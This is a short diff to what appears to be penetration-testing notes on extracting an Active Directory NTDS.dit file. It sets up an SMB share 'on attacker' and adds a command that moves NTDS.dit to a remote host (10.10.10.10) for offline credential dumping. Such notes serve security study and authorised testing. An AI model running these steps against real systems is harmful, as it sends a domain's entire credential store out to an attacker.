@@ -42,8 +42,11 @@ Copy to another location:
 	\GLOBALROOT\Device\HarddiskVolumeShadowCopy2\Windows\NTDS\NTDS.dit 
 	c:\NTDS\NTDS.dit 
 ```
-create a share 
+create a share on attacker 
 ```bash 
 python3 smbserver.py --smb2support CompData /tmp/share
 ```
-then 
+then move to attacker for dumping: 
+```powershell
+cmd.exe /c move C:\NTDS\NTDS.dit \\10.10.10.10
+```
